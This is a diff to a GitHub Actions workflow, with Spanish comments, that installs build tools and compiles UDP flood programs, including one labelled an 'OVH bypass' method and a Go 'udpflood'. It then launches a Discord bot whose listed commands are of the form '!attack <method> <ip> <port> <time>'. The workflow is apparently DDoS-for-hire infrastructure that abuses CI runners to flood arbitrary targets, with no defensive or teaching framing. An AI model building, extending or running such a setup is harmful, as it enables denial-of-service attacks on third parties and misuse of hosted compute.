@@ -1,4 +1,4 @@
-name: Bot3
+name: UDPitufu
 
 on:
   workflow_dispatch:
@@ -18,13 +18,21 @@ jobs:
         with:
           python-version: '3.11'
 
+      - name: Set up Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
       - name: Install Python dependencies
         run: |
           python -m pip install --upgrade pip
           pip install -U discord.py || true
 
       - name: Ensure build tools are available
-        run: sudo apt-get update && sudo apt-get install -y build-essential
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential
+          sudo apt-get install -y libpcap-dev || true
 
       - name: Build UDP binaries
         run: |
@@ -55,21 +63,45 @@ jobs:
             echo "✗ udppps.c no encontrado, omitiendo compilación de udppps"
           fi
 
+          # Compilar ovh.c (método OVH bypass)
+          if [ -f ovh.c ]; then
+            gcc -O3 -pthread ovh.c -o ovh || true
+            if [ -f ovh ]; then
+              echo "✓ Compilado: ovh (método OVH bypass)"
+              chmod +x ovh
+            else
+              echo "⚠ Error al compilar ovh.c, revisa dependencias"
+            fi
+          else
+            echo "✗ ovh.c no encontrado"
+          fi
+
+          # Verificar udpflood.go
+          if [ -f udpflood.go ]; then
+            echo "✓ Encontrado: udpflood.go (método Go)"
+            go build -o udpflood udpflood.go 2>/dev/null || echo "⚠ No se pudo compilar udpflood.go, pero funcionará con 'go run'"
+          else
+            echo "✗ udpflood.go no encontrado"
+          fi
+
           # Listar archivos compilados
           echo ""
-          echo "=== Archivos compilados disponibles ==="
-          for bin in udp udphex udppps; do
+          echo "=== Archivos disponibles ==="
+          for bin in udp udphex udppps ovh udpflood; do
             if [ -f "$bin" ]; then
               echo "✓ $bin (ejecutable)"
             else
-              echo "✗ $bin (no compilado)"
+              if [ -f "$bin.c" ] || [ -f "$bin.go" ]; then
+                echo "✓ $bin (archivo fuente presente)"
+              else
+                echo "✗ $bin (no encontrado)"
+              fi
             fi
           done
           echo "====================================="
 
       - name: Run bot with all methods
         env:
-          # Exponemos el secret como la variable de entorno KEYS que lee bot.py
           KEYS: ${{ secrets.KEYS }}
         run: |
           echo "====================================="
@@ -78,6 +110,22 @@ jobs:
           echo "  !attack udp <ip> <puerto> <tiempo>"
           echo "  !attack udphex <ip> <puerto> <tiempo>"
           echo "  !attack udppps <ip> <puerto> <tiempo>"
+          echo "  !attack udpflood <ip> <puerto> <tiempo>"
+          echo "  !attack ovh <ip> <puerto> <tiempo>"
           echo "  !methods - Muestra información de métodos"
           echo "====================================="
+          
+          # Probar que Go funciona
+          echo "Probando Go..."
+          go version
+          
+          # Verificar permisos para sudo si existe ovh
+          if [ -f ovh ]; then
+            echo "Verificando ejecutable ovh..."
+            ls -la ovh
+            echo "Nota: ovh requiere permisos de root para raw sockets"
+          fi
+          
+          echo ""
+          echo "Iniciando bot..."
           python bot.py
